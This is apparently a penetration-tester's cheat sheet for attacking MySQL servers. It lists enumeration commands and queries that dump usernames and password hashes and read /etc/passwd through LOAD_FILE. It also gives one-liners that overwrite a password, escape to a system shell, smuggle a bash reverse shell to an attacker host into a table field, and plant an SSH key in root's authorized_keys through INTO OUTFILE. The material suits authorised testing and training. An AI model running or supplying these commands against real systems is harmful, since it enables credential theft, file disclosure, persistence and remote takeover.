# MySQL

## Overview

Service reference for login, schema review, file reads/writes, and application-credential abuse.

## Default Ports

- 3306/tcp default

## Quick Enumeration

```bash
nmap --script=mysql-info -p 3306 <target>
mysql -h <target> -u root -p

# use `--skip-ssl` if TLS/SSL error occurs

mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
mysql -u <USERNAME> -h <RHOST> -p --skip-ssl
```
```
mysql> STATUS;
mysql> SHOW databases;
mysql> USE <DATABASE>;
mysql> SHOW tables;
mysql> DESCRIBE <TABLE>;
mysql> SELECT version();
mysql> SELECT system_user();
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
musql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
```
```
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```
```
mysql> \! /bin/sh
```
```
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```
```
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

## Common Attack Paths

- Reused application credentials in `web.config`, `.env`, or PHP config files.
- File read via `LOAD_FILE()` when FILE privilege is present.
- File write or SSH key planting via `SELECT ... INTO OUTFILE` when permissions allow.
- Shell escapes (`\!`) in interactive clients or dangerous UDF/plugin paths when the environment allows it.

## See Also

- `02 Web/SQL Injection.md`
